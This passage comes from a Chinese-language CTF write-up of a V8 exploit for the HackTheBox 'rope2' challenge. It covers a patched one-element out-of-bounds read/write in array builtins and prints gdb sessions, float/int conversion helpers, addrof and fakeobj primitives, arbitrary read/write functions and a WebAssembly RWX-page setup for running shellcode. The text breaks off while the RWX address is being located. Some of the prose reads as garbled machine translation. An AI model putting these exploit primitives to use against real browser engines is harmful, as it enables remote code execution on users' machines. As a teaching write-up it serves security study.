SimpleInstallFunction(isolate_, proto, <span class="string">&quot;push&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypePush, 1, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;reverse&quot;</span>,</span><br></pre></td></tr></table></figure>
+
+<p>这里的&#x2F;src&#x2F;builtins&#x2F;builtins-array.c用来表示添加了一些新函数，这里提到了以下两个添加的函数是ArrayGetLastElement和ArraySetLastElement，逐个分解它们:</p>
+<ul>
+<li><p>ArrayGetLastElement顾名思义,它从数组中最后一个元素,首先计算长度的变量len返回元素存储为len指数,现在i &#x3D; f注意这里,这里的len是绝对长度的数组,因为数组索引从0开始,要访问第0个元素，使用数组[0]，但在这里，因为元素存储在数组中，在len索引处的值因此允许对1个元素进行越界读取。</p>
+</li>
+<li><p>ArraySetLastElement正如名字所说,这个内置函数保存价值的最后索引数组,现在这里,前面的函数,len是计算数组的长度,然后将覆盖指数,定义的元素数组元素(指数)&#x3D;。是的，在这里也有越界的写，但是只写了一个元素。</p>
+</li>
+</ul>
+<p>所以，如上所述，知道有两个函数，使用，以利用这个特定的二进制补丁，并最终chrome浏览器。</p>
+<p>因为这也是一篇非常详细的博客文章，所以将先理解这些概念，然后再继续讨论。</p>
+<p>由于JavaScript是一种动态类型语言，引擎必须将类型信息与每个运行时值一起存储。在v8中，这是通过指针标记和专用类型信息对象(称为映射)的结合来实现的。这些映射用于跟踪在运行时创建的对象，因为这是对象的处理方式，覆盖映射会导致V8引擎内部的一些类型混淆。</p>
+<p>到目前为止，你可能在想究竟如何访问map，最重要的是“如何识别map?”，为此使用了调试版本的d8二进制文件。与allow-natives-syntax将二进制运行时允许您使用</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(&lt;object&gt;)</span><br></pre></td></tr></table></figure>
+
+<p>将打印对象的相关信息,比方说,例如,声明的数组元素,然后使用%DebugPrint (arr)获得所有关于一个对象的信息包括但不限于:</p>
+<ul>
+<li>map的地址</li>
+<li>元素的指针</li>
+<li>类型信息等</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/v8/out.gn/x64.debug<span class="comment"># gdb ./d8</span></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">79 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 1 <span class="built_in">command</span> could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from ./d8...<span class="keyword">done</span>.</span><br><span class="line">gef➤  r --allow-natives-syntax</span><br><span class="line">Starting program: /root/v8build/v8/out.gn/x64.debug/d8 --allow-natives-syntax</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread 0x7ffff260f700 (LWP 6077)]</span><br><span class="line">[New Thread 0x7ffff1e0e700 (LWP 6078)]</span><br><span class="line">[New Thread 0x7ffff160d700 (LWP 6079)]</span><br><span class="line">V8 version 8.5.0 (candidate)</span><br><span class="line">d8&gt; var arr = [1.1, 2.2, 3.3];</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(arr)</span><br><span class="line">DebugPrint: 0x1201080c5e45: [JSArray]</span><br><span class="line"> - map: 0x120108281909 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x12010824923d &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x1201080c5e25 &lt;FixedDoubleArray[3]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1201080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    <span class="comment">#length: 0x1201081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x1201080c5e25 &lt;FixedDoubleArray[3]&gt; &#123;</span><br><span class="line">           0: 1.1</span><br><span class="line">           1: 2.2</span><br><span class="line">           2: 3.3</span><br><span class="line"> &#125;</span><br><span class="line">0x120108281909: [Map]</span><br><span class="line"> - <span class="built_in">type</span>: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: 16</span><br><span class="line"> - inobject properties: 0</span><br><span class="line"> - elements kind: PACKED_DOUBLE_ELEMENTS</span><br><span class="line"> - unused property fields: 0</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - back pointer: 0x1201082818e1 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: 0x1201081c0451 &lt;Cell value= 1&gt;</span><br><span class="line"> - instance descriptors <span class="comment">#1: 0x120108249911 &lt;DescriptorArray[1]&gt;</span></span><br><span class="line"> - transitions <span class="comment">#1: 0x12010824995d &lt;TransitionArray[4]&gt;Transition array #1:</span></span><br><span class="line">     0x120108042f3d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x120108281931 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;</span><br><span class="line"></span><br><span class="line"> - prototype: 0x12010824923d &lt;JSArray[0]&gt;</span><br><span class="line"> - constructor: 0x120108249111 &lt;JSFunction Array (sfi = 0x1201081cc41d)&gt;</span><br><span class="line"> - dependent code: 0x1201080401ed &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction counter: 0</span><br><span class="line"></span><br><span class="line">[1.1, 2.2, 3.3]</span><br></pre></td></tr></table></figure>
+
+<p>分解,现在有arr位于0x1201080c5e45 JSArray类型的,它的map位于0x120108281909,除此之外,根据这些信息,它有一个map的PACKED_DOUBLE_ELEMENTS arr引用有两类型的元素。元素指针位于0x1201080c5e25，长度为3，类型为FixedDoubleArray。现在，使用gdb检查arr周围的内存内容。</p>
+<ul>
+<li>为了检查地址的内存内容，需要从地址中减去1，这样就得到了用于分析的绝对地址。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/4wx 0x1201080c5e45 - 1</span><br><span class="line">0x1201080c5e44:	0x08281909 &lt;----- Map 0x080406e9 &lt;---- Properties 0x080c5e25 &lt;----- Element Array 0x00000006</span><br></pre></td></tr></table></figure>
+
+<p>从调试信息(使用%DebugPrint(arr))和gdb输出中，可以看到第一个元素属于数组本身的映射，第二个属于属性，第三个属于元素数组。如果你注意,使用了x&#x2F;wx地址显示为32位表示,这里是,提交的版本的V8引擎集成后指针压缩,使1是地址的32位整数。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/5xg 0x1201080c5e25 - 1</span><br><span class="line">0x1201080c5e24:	0x0000000608040a3d	0x3ff199999999999a</span><br><span class="line">0x1201080c5e34:	0x400199999999999a	0x400a666666666666</span><br><span class="line">0x1201080c5e44:	0x080406e908281909</span><br><span class="line">gef➤  p/d 0x3ff199999999999a</span><br><span class="line"><span class="variable">$2</span> = 4607632778762754458</span><br><span class="line">gef➤  p/f 0x3ff199999999999a</span><br><span class="line"><span class="variable">$3</span> = 1.1000000000000001</span><br><span class="line">gef➤  p/f 0x400199999999999a</span><br><span class="line"><span class="variable">$4</span> = 2.2000000000000002</span><br></pre></td></tr></table></figure>
+
+<p>现在，因为知道了一个数组是如何表示到V8堆中的，也知道有一个读写漏洞，得出结论，有能力覆盖对象的映射。记住这一点，继续:</p>
+<p>首先，需要使实用函数能够处理指针标记并将浮点值更改为小数，反之亦然。下面的JavaScript函数将完成上述工作:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(8); // 8 byte array buffer</span><br><span class="line">var f64_buf = new Float64Array(buf);</span><br><span class="line">var u64_buf = new Uint32Array(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> ftoi(val, size) &#123;</span><br><span class="line"></span><br><span class="line">    f64_buf[0] = val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(size == 32) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(size == 64) &#123;</span><br><span class="line">        <span class="built_in">return</span> BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) &lt;&lt; <span class="string">32n);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function itof(val, size) &#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(size == 32) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">    &#125; else if(size == 64) &#123;</span></span><br><span class="line"><span class="string">        u64_buf[0] = Number(val &amp; 0xffffffffn);</span></span><br><span class="line"><span class="string">        u64_buf[1] = Number(val &gt;&gt; 32n</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> f64_buf[0];</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述函数用于将浮点数转换为整数，将整数转换为浮点数，因为内存地址将被它们所尊重的值覆盖为浮点数，所以需要它们。</p>
+<p>继续，需要创建一些浮点数组，为了获得所需的泄漏，还需要它们来执行fakeobj和addrof原语，废话不多说，开始:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var float_arr = [1.1, 2.2, 3.3, 4.4, 5.5];</span><br><span class="line">var obj = &#123;<span class="string">&quot;A&quot;</span>:1.1&#125;;</span><br><span class="line">var reg = [1, 2, 3, 4];</span><br></pre></td></tr></table></figure>
+
+<p>这些变量将进一步涉及到利用，接下来，需要得到addrof原语，这意味着需要利用off来读取对象的地址，看看:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var float_arr_map = ftoi(float_arr.GetLastElement(), 32)</span><br><span class="line">var reg_arr_map = float_arr_map - 0xa0n;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[*] Float array map   :  0x&quot;</span> + float_arr_map.toString(16));</span><br><span class="line">console.log(<span class="string">&quot;[*] Regular array map :  0x&quot;</span> + reg_arr_map.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> addrof(in_obj) &#123;</span><br><span class="line">    float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">    float_arr[0] = in_obj;</span><br><span class="line">    float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">    <span class="built_in">let</span> addr = float_arr[0];</span><br><span class="line">    <span class="built_in">return</span> ftoi(addr, 64)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里,首先得到float_arr的map地址和reg数组,然后有一个函数叫做addrof,这需要一个对象将对象地址需要的地址作为参数,要做的是首先用reg数组覆盖float_arr映射的map对象,这意味着,到目前为止,float_arr指向的地址映射reg数组,然后使float_arr的对象需要的地址作为第一个对象,然后将float_arr的映射放回到它原来的位置。</p>
+<p>考虑到，有一个map泄漏，如果试图读取存储在该地址的内容，它将导致:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb165.jpg"></li>
+</ul>
+<p>随着v8 利用的进行，需要一个fakeobj原语。fakeobj函数如下:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> fakeobj(addr) &#123;</span><br><span class="line">    float_arr[0] = itof(addr, 32);</span><br><span class="line">    float_arr.SetLastElement(itof(reg_arr_map, 32));</span><br><span class="line">    <span class="built_in">let</span> fake = float_arr[0];</span><br><span class="line">    float_arr.SetLastElement(itof(float_arr_map, 32));</span><br><span class="line">    <span class="built_in">return</span> fake;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>来谈谈fakeobj函数,这种原始的,在这个漏洞和特定的上下文中,把假的对象的地址,想把它放置到float_arr的第一个元素,然后改变了float_arr map到reg数组的map,所以往往从第0个索引来访问数据,其工作原理是:</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb166.jpg"></p>
+</li>
+<li><p>把想要覆盖另一个对象的对象地址覆盖</p>
+</li>
+<li><p>将float_arr的映射设置为reg的映射</p>
+</li>
+<li><p>从float_arr中获取假对象</p>
+</li>
+<li><p>把float_arr的map放回原来的位置</p>
+</li>
+</ul>
+<p>这些原语是在进入读&#x2F;写原语之前需要的，不过有了这些原语，现在可以处理函数arb_read和arb_write，这两个函数分别用于从一个地址的值中读地址或从一个地址的值中写地址。</p>
+<p>继续，对任意读函数感兴趣，将尽力解释，目前，考虑下面的函数，它用于从任意地址读取值:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var rw_helper = [itof(float_arr_map, 64), 1.1, 2.2, 3.3];</span><br><span class="line">var rw_helper_addr = addrof(rw_helper) &amp; 0xffffffffn;</span><br><span class="line"></span><br><span class="line">console.log(<span class="string">&quot;[+] Controlled RW helper address: 0x&quot;</span> + rw_helper_addr.toString(16));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> arb_read(addr) &#123;</span><br><span class="line">    <span class="built_in">let</span> fake = fakeobj(rw_helper_addr - 0x20n);</span><br><span class="line">    rw_helper[1] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    return ftoi(fake[<span class="number">0</span>], <span class="number">64</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第一这个函数是通过fakeobj函数制造一个假的对象,然后把想读的地址,写rw_helper数组的第一个指数,然后第一个元素假的对象是错误的,这是函数的跟进,导致整个逻辑的理解，d8二进制解释步骤:</p>
+<p>使用rw_helper的地址创建fakeobj，从中减去0x20，因为32个字节是用于内存布局的，在本例中，这样做是因为:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@luci:~/v8build/v8/out.gn/x64.release<span class="comment"># gdb ./d8</span></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type <span class="string">&quot;show copying&quot;</span></span><br><span class="line">and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">GEF <span class="keyword">for</span> linux ready, <span class="built_in">type</span> `gef<span class="string">&#x27; to start, `gef config&#x27;</span> to configure</span><br><span class="line">79 commands loaded <span class="keyword">for</span> GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 1 <span class="built_in">command</span> could not be loaded, run `gef missing` to know why.</span><br><span class="line">Reading symbols from ./d8...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gef➤  run --allow-natives-syntax --shell /root/v8build/rope2/xpl.js</span><br><span class="line">Starting program: /root/v8build/v8/out.gn/x64.release/d8 --allow-natives-syntax --shell /root/v8build/rope2/xpl.js</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread 0x7ffff66c4700 (LWP 9528)]</span><br><span class="line">[New Thread 0x7ffff5ec3700 (LWP 9529)]</span><br><span class="line">[New Thread 0x7ffff56c2700 (LWP 9530)]</span><br><span class="line">[*] Float array map   :  0x8241909</span><br><span class="line">[*] Regular array map :  0x8241869</span><br><span class="line">[+] Controlled RW helper address: 0x8086b21</span><br><span class="line">V8 version 8.5.0 (candidate)</span><br><span class="line">d8&gt; %DebugPrint(rw_helper);</span><br><span class="line">0x06a908086b21 &lt;JSArray[4]&gt;</span><br><span class="line">[6.7481182e-316, 1.1, 2.2, 3.3]</span><br><span class="line">d8&gt; ^C</span><br><span class="line">gef➤  x/10xg 0x06a908086b21 - 1 - 0x30</span><br><span class="line">0x6a908086af0:	0x0000393638313432	0x0000000808040a3d</span><br><span class="line">0x6a908086b00:	0x0000000008241909	0x3ff199999999999a</span><br><span class="line">0x6a908086b10:	0x400199999999999a	0x400a666666666666</span><br><span class="line">0x6a908086b20:	0x080406e908241909	0x0000000808086af9</span><br><span class="line">0x6a908086b30:	0x0000000208040975	0x0000000008241909</span><br><span class="line">gef➤  x/10xg 0x06a908086b21 - 1 - 0x20</span><br><span class="line">0x6a908086b00:	0x0000000008241909	0x3ff199999999999a</span><br><span class="line">0x6a908086b10:	0x400199999999999a	0x400a666666666666</span><br><span class="line">0x6a908086b20:	0x080406e908241909	0x0000000808086af9</span><br><span class="line">0x6a908086b30:	0x0000000208040975	0x0000000008241909</span><br><span class="line">0x6a908086b40:	0x0000000008040975	0x0000000008040245</span><br><span class="line">gef➤  p 0x06a908086b21 - 0x20</span><br><span class="line"><span class="variable">$2</span> = 0x6a908086b01</span><br><span class="line">gef➤  p 0x06a908086b21 - 0x20 - 1</span><br><span class="line"><span class="variable">$3</span> = 0x6a908086b00</span><br><span class="line"></span><br><span class="line">如果在地址‘0x6a908086b00’处放置一个假对象，就能够访问索引1，也就是‘0x6a908086b10’。这样，生成的假对象将指向想要的地址的值。</span><br></pre></td></tr></table></figure>
+
+<p>对于write函数，它的工作原理与read函数相同:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> arb_write(addr, value) &#123;</span><br><span class="line">    <span class="built_in">let</span> fake = fakeobj(rw_helper_addr - 0x20n);</span><br><span class="line">    rw_helper[1] = itof((<span class="number">0</span>x8n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">0</span>x8n, <span class="number">64</span>);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(value, <span class="number">64</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果把逻辑分解:</p>
+<ul>
+<li>如果与arb_read的函数相比，它将覆盖存储在第一个下标处的值，而不是返回假数组的第一个值，这是伪造对象的结果。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">return</span> ftoi(fake[0], 64);</span><br></pre></td></tr></table></figure>
+
+<p>以上来自arb_read。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fake[0] = itof(value, 64);</span><br></pre></td></tr></table></figure>
+
+<p>这是通过覆盖其它返回值读取函数,从这里利用下去,所说的在<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvZW4tVVMvZG9jcy9XZWJBc3NlbWJseQ==">WebAssembly Page in JS<i class="fa fa-external-link-alt"></i></span>,所以一开始,不能用经典的使用pwn挑战的方法使用system __free_hook覆盖,然后生成一个shell,在基于v8的挑战, 主要是CTFs,这是通过创建一个wasm函数来完成的，它将导致在程序的内存布局中创建一个rwx权限页，从这里的方法如下:</p>
+<ul>
+<li>找到rwx段地址，计算它的地址。</li>
+<li>将shellcode写入rwx段的区域。</li>
+<li>调用前面创建的wasm函数，因为shellcode将写入该函数，调用它最终将导致shellcode执行。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,</span><br><span class="line">                               130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,</span><br><span class="line">                               128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,</span><br><span class="line">                               128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,</span><br><span class="line">                               0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,0,11]);</span><br><span class="line">var wasm_module = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_module);</span><br><span class="line">var pwn = wasm_instance.exports.main;</span><br></pre></td></tr></table></figure>
+
+<p>这是用于创建rwx部分的pwn函数的JS代码，这一步先放在一边，继续:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var wasm_instance_addr = addrof(wasm_instance) &amp; 0xffffffffn;</span><br><span class="line">var rwx = arb_read(wasm_instance_addr + 0x68n &amp; 0xffffffffn);</span><br></pre></td></tr></table></figure>
+
+<p>首先,需要找到rwx段的基地址,这是很容易找到的,要做的是找到的地址正是位于存储到内存和抵消,使用gef的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search-pattern rwx_address</span><br></pre></td></tr></table></figure>
+
+<p>发现内存的引用位于抵消wasm_instance_addr + 0x68:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x000015fc5408a000 0x000015fc5408b000 0x0000000000000000 rwx </span><br><span class="line">0x0000190900000000 0x000019090000c000 0x0000000000000000 rw- </span><br><span class="line">0x000019090000c000 0x0000190900040000 0x0000000000000000 --- </span><br><span class="line">0x0000190900040000 0x0000190900041000 0x0000000000000000 rw- </span><br><span class="line">0x0000190900041000 0x0000190900042000 0x0000000000000000 --- </span><br><span class="line">0x0000190900042000 0x0000190900052000 0x0000000000000000 r-x </span><br><span class="line">0x0000190900052000 0x000019090007f000 0x0000000000000000 ---</span><br><span class="line"></span><br><span class="line">[..snip..]</span><br><span class="line"></span><br><span class="line">gef➤  search-pattern 0x000015fc5408a000</span><br><span 